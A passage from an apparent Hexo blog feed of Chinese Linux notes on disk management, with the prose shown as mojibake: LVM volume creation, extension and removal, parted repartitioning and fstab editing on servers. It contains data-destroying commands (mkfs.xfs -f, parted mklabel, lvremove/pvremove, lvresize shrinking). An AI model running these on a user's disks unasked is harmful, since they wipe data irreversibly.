æœåŠ¡å™¨åœ°å€ï¼Œå¤šä¸ª DNS æœåŠ¡å™¨åœ°å€éœ€è¦ç”¨è‹±æ–‡é€—å·åˆ†éš”å¼€</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202212) ç£ç›˜ç®¡ç†</title>
    <link href="/2022/12/28/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202212)%20%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"/>
    <url>/2022/12/28/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202212)%20%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">æŸ¥çœ‹ç£ç›˜ä½¿ç”¨ç‡<br><span class="hljs-built_in">df</span> -h<br>æŸ¥çœ‹å•ä¸ªç›®å½•çš„æŒ‚è½½æƒ…å†µ(ç›®å½•å±äºå“ªä¸ªåˆ†åŒº)<br><span class="hljs-built_in">df</span> -h /home<br><br>fdisk -l<br>lsblk<br><span class="hljs-comment"># æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç±»å‹</span><br>lsblk -f <br><br>lvremove<br>vgremove<br>pvremove<br><br><span class="hljs-comment"># fdisk /dev/sdb</span><br>:d  <span class="hljs-comment"># åˆ é™¤</span><br>:w  <span class="hljs-comment"># ä¿å­˜</span><br>dosåˆ†åŒºè¡¨ ä¸€ä¸ªåˆ†åŒºæœ€å¤§2T<br>gptåˆ†åŒºè¡¨ ä¸é™åˆ¶<br><br>æŸ¥çœ‹æ˜¯ä¸æ˜¯ssd<br><span class="hljs-comment"># ä½¿ç”¨lsblkå‘½ä»¤è¿›è¡Œåˆ¤æ–­ï¼Œå‚æ•°-dè¡¨ç¤ºä»…æ˜¾ç¤ºè®¾å¤‡æœ¬èº«ï¼ˆä¸æ˜¾ç¤ºå…¶ä¸Šåˆ†åŒºï¼‰ï¼Œå‚æ•°-oè¡¨ç¤ºä»…æ˜¾ç¤ºç‰¹å®šçš„åˆ—ã€‚</span><br><span class="hljs-comment"># # 0æ˜¯ssd 1æ˜¯hdd</span><br><span class="hljs-comment"># lsblk -d -o name,rota   </span><br><span class="hljs-comment"># grep ^ /sys/block/*/queue/rotational</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># lvremove /dev/mapper/vgqjc-lvqjc </span><br>Do you really want to remove active logical volume vgqjc/lvqjc? [y/n]: y<br>  Logical volume <span class="hljs-string">&quot;lvqjc&quot;</span> successfully removed<br>[root@localhost ~]<span class="hljs-comment"># vgremove /dev/mapper/vgqjc</span><br>  Volume group <span class="hljs-string">&quot;vgqjc&quot;</span> successfully removed<br>[root@localhost ~]<span class="hljs-comment"># pvremove /dev/sdl</span><br>  Labels on physical volume <span class="hljs-string">&quot;/dev/sdl&quot;</span> successfully wiped.<br>[root@localhost ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment"># lsblk -d -o name,rota</span><br>NAME ROTA<br>sda     1<br>sdb     1<br>[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment">#</span><br>[root@zqzt-wx13f33-zbhx08w ~]<span class="hljs-comment"># grep ^ /sys/block/*/queue/rotational</span><br>/sys/block/dm-0/queue/rotational:1<br>/sys/block/dm-1/queue/rotational:1<br>/sys/block/sda/queue/rotational:1<br>/sys/block/sdb/queue/rotational:1<br><br></code></pre></td></tr></table></figure><p><code>fdisk</code>å‘½ä»¤ä¸­deviceé€šå¸¸æ˜¯<code>/dev/hda</code>ã€<code>/dev/hdb</code>â€¦.(IDEæ¥å£ç±»å‹çš„ç¡¬ç›˜è®¾å¤‡å)æˆ–<code>/dev/sda</code>ã€<code>/dev/sdb</code>â€¦.(SCSIæ¥å£ç±»å‹ç¡¬ç›˜è®¾å¤‡å)ï¼Œè¡¨ç¤ºæ•´ä¸ªç¡¬ç›˜ï¼Œå¦‚æœç¡¬ç›˜è¢«åˆ†åŒºï¼Œåˆ™åœ¨è®¾å¤‡ååè¿½åŠ ä¸€ä¸ªæ•°å­—è¡¨ç¤ºæ­¤è®¾å¤‡çš„ç¬¬å‡ ä¸ªåˆ†åŒºã€‚å¦‚ä¸Šä¾‹ä¸­çš„<code>/dev/sda1</code>å’Œ<code>/dev/sda2</code></p><p>ç–‘é—®ï¼š<br>1.IDEæ¥å£ç±»å‹çš„ç¡¬ç›˜å’ŒSCSIæ¥å£ç±»å‹ç¡¬ç›˜æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ<br>2.&#x2F;etc&#x2F;mtabå’Œ&#x2F;etc&#x2F;fstabçš„åŒºåˆ«ï¼Ÿ</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gcode">lvdisplay<br>pvdisplay<br>vgdisplay<br><br>å¯ä»¥ä½¿ç”¨pvdisplay æˆ–è€…p<span class="hljs-attr">vscanæŸ¥çœ‹åˆ›å»ºçš„ç‰©ç†å·  </span><br><span class="hljs-attr">ä½¿ç”¨vgdisplay æˆ–è€…vgscan æŸ¥çœ‹å·ç»„  </span><br><span class="hljs-attr">ä½¿ç”¨lvscan æˆ–è€…lvdisplayæŸ¥çœ‹[é€»è¾‘å·](https://so.csdn.net/so/search?q=%E9</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BB<span class="hljs-meta">%</span>E<span class="hljs-number">8</span><span class="hljs-meta">%</span>BE<span class="hljs-meta">%</span><span class="hljs-number">91</span><span class="hljs-meta">%</span>E<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>D<span class="hljs-meta">%</span>B<span class="hljs-number">7</span>&amp;spm=<span class="hljs-number">1001.2101</span><span class="hljs-number">.3001</span><span class="hljs-number">.7020</span>)  <br>ä½¿ç”¨df -hæŸ¥çœ‹æ˜¯å¦åˆ›å»ºæˆåŠŸ<br></code></pre></td></tr></table></figure><h2 id="éœ€æ±‚1ï¼šæ‰©å®¹æŸä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿç›®å½•"><a href="#éœ€æ±‚1ï¼šæ‰©å®¹æŸä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿç›®å½•" class="headerlink" title="éœ€æ±‚1ï¼šæ‰©å®¹æŸä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿç›®å½•"></a>éœ€æ±‚1ï¼šæ‰©å®¹æŸä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿç›®å½•</h2><h3 id="å½“å‰æƒ…å†µ"><a href="#å½“å‰æƒ…å†µ" class="headerlink" title="å½“å‰æƒ…å†µ"></a>å½“å‰æƒ…å†µ</h3><p>å½“å‰ç£ç›˜æƒ…å†µ</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324155257.png" alt="image.png"></p><p>æŸ¥çœ‹ä½ æ–‡ä»¶ç³»ç»Ÿç±»å‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsblk -f<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324155421.png" alt="image.png"></p><p>å½“å‰pvï¼Œvgï¼Œlvæƒ…å†µï¼š<br>å½“å‰sdbä¸‹æœ‰sdb1åˆ†åŒº<br>åŸºäº&#x2F;dev&#x2F;sdb1åˆ›å»ºäº†pv </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pvcreate Â /dev/sdb1 --force<br></code></pre></td></tr></table></figure><p>åŸºäºpvåˆ›å»ºäº†vg(datavgä¸ºvgçš„åå­—)                 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vgcreate Â datavg /dev/sdb1<br></code></pre></td></tr></table></figure><p>åŸºäºdatavgåˆ›å»ºäº†lv(lv_data_xxx_dataä¸ºlvçš„åå­—)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo lvcreate Â -L 4T -n lv_data_xxx_data datavg<br>sudo mkfs.xfs Â -f /dev/mapper/datavg-lv_data_xxx_data<br></code></pre></td></tr></table></figure><p>æŒ‚è½½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mount Â /dev/mapper/datavg-lv_data_xxx_data /vdata/xxx/data<br></code></pre></td></tr></table></figure><h3 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h3><p>æƒ³æŠŠsdcåˆ°sdmè¿™äº›ç£ç›˜å…¨éƒ¨æŒ‚è½½åˆ°&#x2F;vdata&#x2F;tg-paas&#x2F;dataä¸‹ï¼Œè¯¥å¦‚ä½•å®ç°ï¼Ÿ</p><h3 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo parted Â -s /dev/sdc mklabel gpt<br>sudo parted Â -s /dev/sdc mkpart primary xfs 0 100%<br>sudo mkfs.xfs Â -f /dev/sdc1<br><br>sudo pvcreate Â /dev/sdc1 --force<br><br>sudo vgextend datavg /dev/sdc1<br><br>lvresize -L +9.1T /dev/mapper/datavg-lv_data_xxx_data<br><br><span class="hljs-comment"># ä½¿ç”¨xfs_groupfsè¿›è¡Œåœ¨çº¿è°ƒæ•´xfsæ ¼å¼çš„æ–‡ä»¶ç³»ç»Ÿå¤§å°</span><br><span class="hljs-comment"># lsblk -f æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç±»å‹</span><br>xfs_growfs /dev/mapper/datavg-lv_data_xxx_data<br><br><span class="hljs-comment"># æŸ¥çœ‹å·²ç»æ‰©å®¹æˆåŠŸ</span><br>lsblk<br><span class="hljs-built_in">df</span> -h<br></code></pre></td></tr></table></figure><h2 id="éœ€æ±‚2ï¼šç»™æŸä¸ªç›®å½•-x2F-var-x2F-www-x2F-htmlæŒ‚ç›˜"><a href="#éœ€æ±‚2ï¼šç»™æŸä¸ªç›®å½•-x2F-var-x2F-www-x2F-htmlæŒ‚ç›˜" class="headerlink" title="éœ€æ±‚2ï¼šç»™æŸä¸ªç›®å½•&#x2F;var&#x2F;www&#x2F;htmlæŒ‚ç›˜"></a>éœ€æ±‚2ï¼šç»™æŸä¸ªç›®å½•&#x2F;var&#x2F;www&#x2F;htmlæŒ‚ç›˜</h2><h3 id="æŒ‚è½½"><a href="#æŒ‚è½½" class="headerlink" title="æŒ‚è½½"></a>æŒ‚è½½</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsblk<br><span class="hljs-built_in">df</span> -h | <span class="hljs-built_in">head</span> -n 20<br><br><span class="hljs-built_in">mkdir</span> -p /var/www/html<br><br><br>lvdisplay | sudo grep  lv_pkg<br>sudo lvcreate  -L 200G -n lv_pkg datavg<br>sudo mkfs.xfs  -f /dev/mapper/datavg-lv_pkg<br>sudo mount  | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg on /var/www/html&quot;</span><br>sudo mount  /dev/mapper/datavg-lv_pkg /var/www/html<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/mtab  | sudo grep  datavg-lv_pkg &gt;&gt; /etc/fstab<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab<br><br>sudo <span class="hljs-built_in">df</span> -h |grep html<br><span class="hljs-built_in">df</span> -h | grep var<br></code></pre></td></tr></table></figure><h3 id="è§£æŒ‚"><a href="#è§£æŒ‚" class="headerlink" title="è§£æŒ‚"></a>è§£æŒ‚</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># df -h | grep var</span><br>/dev/mapper/rootvg-lv_var               60G   49G   12G  81% /var<br>/dev/mapper/datavg-lv_log_tg_paas      500G  3.6G  497G   1% /var/log/tg-paas<br>/dev/mapper/datavg-lv_log_pods         500G  3.8G  497G   1% /var/log/pods<br>/dev/mapper/datavg-lv_pkg              1.0T  7.2G 1017G   1% /var/www/html<br><span class="hljs-comment"># cd ~</span><br><span class="hljs-comment"># umount /dev/mapper/datavg-lv_pkg</span><br><span class="hljs-comment"># df -h | grep var</span><br>/dev/mapper/rootvg-lv_var               60G   49G   12G  81% /var<br>/dev/mapper/datavg-lv_log_tg_paas      500G  3.6G  497G   1% /var/log/tg-paas<br>/dev/mapper/datavg-lv_log_pods         500G  3.8G  497G   1% /var/log/pods<br><br><span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 446.1G  0 disk <br>â”œâ”€sda1                          8:1    0   512M  0 part /boot/efi<br>â”œâ”€sda2                          8:2    0     1G  0 part /boot<br>â””â”€sda3                          8:3    0 444.6G  0 part <br>  â”œâ”€rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  â”œâ”€rootvg-lv_swap            252:1    0    16G  0 lvm  <br>  â”œâ”€rootvg-lv_var             252:3    0    60G  0 lvm  /var<br>  â”œâ”€rootvg-lv_home            252:6    0    20G  0 lvm  /home<br>  â””â”€rootvg-lv_kerneldata_etcd 252:8    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0   4.9T  0 disk <br>â””â”€sdb1                          8:17   0   4.9T  0 part <br>  â”œâ”€datavg-lv_data            252:2    0   500G  0 lvm  /vdata<br>  â”œâ”€datavg-lv_data_net        252:4    0   100G  0 lvm  /vdata/net<br>  â”œâ”€datavg-lv_log_pods        252:5    0   500G  0 lvm  /var/log/pods<br>  â”œâ”€datavg-lv_log_tg_paas     252:7    0   500G  0 lvm  /var/log/tg-paas<br>  â””â”€datavg-lv_pkg             252:9    0     1T  0 lvm  <br><br><br><span class="hljs-comment"># lvresize -L 200G /dev/mapper/datavg-lv_pkg</span><br>  WARNING: Reducing active logical volume to 200.00 GiB.<br>  THIS MAY DESTROY YOUR DATA (filesystem etc.)<br>Do you really want to reduce datavg/lv_pkg? [y/n]: y<br>  Size of logical volume datavg/lv_pkg changed from 1.00 TiB (262144 extents) to 200.00 GiB (51200 extents).<br>  Logical volume datavg/lv_pkg successfully resized.<br><br><br><span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 446.1G  0 disk <br>â”œâ”€sda1                          8:1    0   512M  0 part /boot/efi<br>â”œâ”€sda2                          8:2    0     1G  0 part /boot<br>â””â”€sda3                          8:3    0 444.6G  0 part <br>  â”œâ”€rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  â”œâ”€rootvg-lv_swap            252:1    0    16G  0 lvm  <br>  â”œâ”€rootvg-lv_var             252:3    0    60G  0 lvm  /var<br>  â”œâ”€rootvg-lv_home            252:6    0    20G  0 lvm  /home<br>  â””â”€rootvg-lv_kerneldata_etcd 252:8    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0   4.9T  0 disk <br>â””â”€sdb1                          8:17   0   4.9T  0 part <br>  â”œâ”€datavg-lv_data            252:2    0   500G  0 lvm  /vdata<br>  â”œâ”€datavg-lv_data_net        252:4    0   100G  0 lvm  /vdata/net<br>  â”œâ”€datavg-lv_log_pods        252:5    0   500G  0 lvm  /var/log/pods<br>  â”œâ”€datavg-lv_log_tg_paas     252:7    0   500G  0 lvm  /var/log/tg-paas<br>  â””â”€datavg-lv_pkg             252:9    0   200G  0 lvm  <br><br><br>sudo mkfs.xfs  -f /dev/mapper/datavg-lv_pkg<br>sudo mount  | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg on /var/www/html&quot;</span><br>sudo mount  /dev/mapper/datavg-lv_pkg /var/www/html<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br><br>åˆ é™¤å¯¹åº”è¡Œ<br><br><br>sudo <span class="hljs-built_in">cat</span>  /etc/mtab  | sudo grep  datavg-lv_pkg &gt;&gt; /etc/fstab<br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab | sudo grep  <span class="hljs-string">&quot;/dev/mapper/datavg-lv_pkg&quot;</span><br>sudo <span class="hljs-built_in">cat</span>  /etc/fstab<br><br><br></code></pre></td></tr></table></figure><h2 id="éœ€æ±‚3ï¼šsdbä¸‹é¢åˆ†äº†ä¸‰ä¸ªåŒºï¼Œæƒ³è¦å˜æˆ1ä¸ª"><a href="#éœ€æ±‚3ï¼šsdbä¸‹é¢åˆ†äº†ä¸‰ä¸ªåŒºï¼Œæƒ³è¦å˜æˆ1ä¸ª" class="headerlink" title="éœ€æ±‚3ï¼šsdbä¸‹é¢åˆ†äº†ä¸‰ä¸ªåŒºï¼Œæƒ³è¦å˜æˆ1ä¸ª"></a>éœ€æ±‚3ï¼šsdbä¸‹é¢åˆ†äº†ä¸‰ä¸ªåŒºï¼Œæƒ³è¦å˜æˆ1ä¸ª</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>â”œâ”€sda1                          8:1    0   512M  0 part /boot/efi<br>â”œâ”€sda2                          8:2    0     1G  0 part /boot<br>â””â”€sda3                          8:3    0 892.3G  0 part <br>  â”œâ”€rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  â”œâ”€rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  â”œâ”€rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  â”œâ”€rootvg-lv_home            252:3    0    20G  0 lvm  /home<br>  â””â”€rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>â”œâ”€sdb1                          8:17   0   512M  0 part <br>â”œâ”€sdb2                          8:18   0     1G  0 part <br>â””â”€sdb3                          8:19   0   7.3T  0 part <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># ls /dev/sdb1</span><br>/dev/sdb1<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo ls -l /dev/mapper/ | sudo grep datavg</span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>1<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo parted  -s /dev/sdb mklabel gpt</span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>â”œâ”€sda1                          8:1    0   512M  0 part /boot/efi<br>â”œâ”€sda2                          8:2    0     1G  0 part /boot<br>â””â”€sda3                          8:3    0 892.3G  0 part <br>  â”œâ”€rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  â”œâ”€rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  â”œâ”€rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  â”œâ”€rootvg-lv_home            252:3    0    20G  0 lvm  /home<br>  â””â”€rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># echo $?</span><br>0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo parted  -s /dev/sdb mkpart primary xfs 0 100%</span><br>Warning: The resulting partition is not properly aligned <span class="hljs-keyword">for</span> best performance: 34s % 2048s != 0s<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># sudo mkfs.xfs  -f /dev/sdb1</span><br>warning: device is not properly aligned /dev/sdb1<br>meta-data=/dev/sdb1              isize=512    agcount=32, agsize=244171712 blks<br>         =                       sectsz=512   attr=2, projid32bit=1<br>         =                       crc=1        finobt=1, sparse=1, rmapbt=0<br>         =                       reflink=1<br>data     =                       bsize=4096   blocks=7813494784, imaxpct=5<br>         =                       sunit=64     swidth=256 blks<br>naming   =version 2              bsize=4096   ascii-ci=0, ftype=1<br><span class="hljs-built_in">log</span>      =internal <span class="hljs-built_in">log</span>           bsize=4096   blocks=521728, version=2<br>         =                       sectsz=512   sunit=64 blks, lazy-count=1<br>realtime =none                   extsz=4096   blocks=0, rtextents=0<br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># lsblk</span><br>NAME                          MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT<br>sda                             8:0    0 893.8G  0 disk <br>â”œâ”€sda1                          8:1    0   512M  0 part /boot/efi<br>â”œâ”€sda2                          8:2    0     1G  0 part /boot<br>â””â”€sda3                          8:3    0 892.3G  0 part <br>  â”œâ”€rootvg-lv_root            252:0    0    20G  0 lvm  /<br>  â”œâ”€rootvg-lv_swap            252:1    0    16G  0 lvm  [SWAP]<br>  â”œâ”€rootvg-lv_var             252:2    0    60G  0 lvm  /var<br>  â”œâ”€rootvg-lv_home            252:3    0    20G  0 lvm  /home<br>  â””â”€rootvg-lv_kerneldata_etcd 252:4    0    50G  0 lvm  /kerneldata/etcd<br>sdb                             8:16   0  29.1T  0 disk <br>â””â”€sdb1                          8:17   0  29.1T  0 part <br>sdc                             8:32   0  29.1T  0 disk <br>nvme1n1                       259:0    0   1.5T  0 disk <br>nvme0n1                       259:1    0   1.5T  0 disk <br>[root@tgypt-wxd43-zbhx243w ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h2 id="éœ€æ±‚4ï¼š"><a href="#éœ€æ±‚4ï¼š" class="headerlink" title="éœ€æ±‚4ï¼š"></a>éœ€æ±‚4ï¼š</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829091751.png" 